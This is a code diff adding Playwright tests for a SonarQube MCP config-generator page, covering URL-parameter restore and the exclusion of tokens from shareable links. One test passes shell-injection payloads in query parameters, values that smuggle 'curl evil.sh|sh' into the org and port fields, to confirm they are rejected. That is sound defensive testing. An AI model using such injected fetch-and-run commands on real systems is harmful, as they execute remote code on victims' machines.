@@ -411,4 +411,113 @@ test.describe('config-generator.html', () => {
     expect(parsed.mcpServers.sonarqube.headers).toBeDefined();
     expect(parsed.mcpServers.sonarqube.headers.SONARQUBE_PROJECT_KEY).toBeUndefined();
   });
+
+  test('URL params: restores non-sensitive configuration on load', async ({ page }) => {
+    await page.goto('/config-generator.html?agent=cursor&env=cloud&transport=sqc&org=my-shared-org&projectKey=shared_project&readonly=1');
+    await expect(page.locator('#tool-projects')).toBeAttached();
+    await expect(page.locator('#agent')).toHaveValue('cursor');
+    await expect(page.locator('#envControl .segment-btn[data-value="cloud"]')).toHaveClass(/active/);
+    await expect(page.locator('#card-sqc')).toHaveClass(/active/);
+    await expect(page.locator('#pf-org')).toHaveValue('my-shared-org');
+    await expect(page.locator('#projectKey')).toHaveValue('shared_project');
+    await expect(page.locator('#opt-readonly')).toBeChecked();
+    const out = await page.locator('#codeOutput').textContent();
+    const parsed = JSON.parse(out!.trim());
+    expect(parsed.mcpServers.sonarqube.headers['SONARQUBE_ORG']).toBe('my-shared-org');
+    expect(parsed.mcpServers.sonarqube.headers['SONARQUBE_READ_ONLY']).toBe('true');
+  });
+
+  test('URL params: never includes user token', async ({ page }) => {
+    await selectCursor(page);
+    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
+    await page.locator('#pf-org').fill('my-org');
+    await page.locator('#token').fill('sqp_super_secret_token');
+    await page.locator('#card-sqc').click();
+    await expect(page).toHaveURL(/agent=cursor/);
+    await expect(page).toHaveURL(/transport=sqc/);
+    await expect(page).toHaveURL(/org=my-org/);
+    const search = new URL(page.url()).searchParams;
+    expect(search.has('token')).toBe(false);
+    expect(search.has('SONARQUBE_TOKEN')).toBe(false);
+    expect(page.url()).not.toContain('sqp_super_secret_token');
+  });
+
+  test('URL params: ignores invalid values safely', async ({ page }) => {
+    await page.goto('/config-generator.html?agent=not-a-real-agent&transport=teleport&foo=bar');
+    await expect(page.locator('#tool-projects')).toBeAttached();
+    await expect(page.locator('#agent')).toHaveValue('');
+    await expect(page.locator('#card-stdio')).toHaveClass(/active/);
+    await expect(page.locator('#codeOutput')).toContainText('Please select a target client');
+  });
+
+  test('URL params: refresh preserves non-sensitive configuration', async ({ page }) => {
+    await page.goto('/config-generator.html?agent=cursor&transport=sqc&org=refresh-org');
+    await expect(page.locator('#tool-projects')).toBeAttached();
+    await expect(page.locator('#pf-org')).toHaveValue('refresh-org');
+    await page.reload();
+    await expect(page.locator('#agent')).toHaveValue('cursor');
+    await expect(page.locator('#pf-org')).toHaveValue('refresh-org');
+    await expect(page.locator('#card-sqc')).toHaveClass(/active/);
+  });
+
+  test('URL params: secret query params are ignored on load', async ({ page }) => {
+    await page.goto('/config-generator.html?agent=cursor&transport=https&httpMode=launch&token=leaked-token&keystorePassword=leaked-password');
+    await expect(page.locator('#tool-projects')).toBeAttached();
+    await expect(page.locator('#agent')).toHaveValue('cursor');
+    await expect(page.locator('#card-https')).toHaveClass(/active/);
+    await expect(page.locator('#token')).toHaveValue('');
+    await expect(page.locator('#keystorePassword')).toHaveValue('');
+  });
+
+  test('URL params: rejects shell-injection payloads on load', async ({ page }) => {
+    await page.goto('/config-generator.html?agent=cursor&org=x%22;curl%20evil.sh|sh;echo%20%22&httpPort=8080;curl%20evil|sh%23');
+    await expect(page.locator('#tool-projects')).toBeAttached();
+    await expect(page.locator('#agent')).toHaveValue('cursor');
+    await expect(page.locator('#pf-org')).toHaveValue('');
+    await expect(page.locator('#httpPort')).toHaveValue('8080');
+  });
+
+  test('Copy shareable link survives rapid repeat clicks', async ({ page, context }) => {
+    await context.grantPermissions(['clipboard-read', 'clipboard-write']);
+    await selectCursor(page);
+    await page.evaluate(() => document.getElementById('feedbackFab')?.remove());
+    await expect(page.locator('#copyLinkBtn')).toBeEnabled();
+    await page.locator('#copyLinkBtn').click();
+    await page.locator('#copyLinkBtn').click();
+    await expect(page.locator('#copyLinkBtn')).toContainText('Copy shareable link', { timeout: 3000 });
+  });
+
+  test('Copy shareable link copies URL without token', async ({ page, context }) => {
+    await context.grantPermissions(['clipboard-read', 'clipboard-write']);
+    await selectCursor(page);
+    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
+    await page.locator('#pf-org').fill('share-org');
+    await page.locator('#token').fill('sqp_super_secret_token');
+    await page.locator('#card-sqc').click();
+    await expect(page.locator('#copyLinkBtn')).toBeEnabled();
+    await page.evaluate(() => document.getElementById('feedbackFab')?.remove());
+    await page.locator('#copyLinkBtn').click();
+    await expect(page.locator('#copyLinkBtn')).toContainText('Copied');
+    const clipboard = await page.evaluate(() => navigator.clipboard.readText());
+    expect(clipboard).toContain('agent=cursor');
+    expect(clipboard).toContain('org=share-org');
+    expect(clipboard).toContain('transport=sqc');
+    expect(clipboard).not.toMatch(/token/i);
+    expect(clipboard).not.toContain('sqp_super_secret_token');
+  });
+
+  test('URL params: restores paths with spaces and backslashes', async ({ page }) => {
+    const workspacePath = '/Users/Jane Doe/project';
+    const certPath = 'C:\\certs\\custom';
+    await page.goto(
+      '/config-generator.html?agent=cursor&workspaceMount=1'
+      + '&workspaceHostPath=' + encodeURIComponent(workspacePath)
+      + '&certs=1&certPath=' + encodeURIComponent(certPath),
+    );
+    await expect(page.locator('#tool-projects')).toBeAttached();
+    await expect(page.locator('#opt-workspace-mount')).toBeChecked();
+    await expect(page.locator('#workspaceHostPath')).toHaveValue(workspacePath);
+    await expect(page.locator('#opt-certs')).toBeChecked();
+    await expect(page.locator('#certPath')).toHaveValue(certPath);
+  });
 });
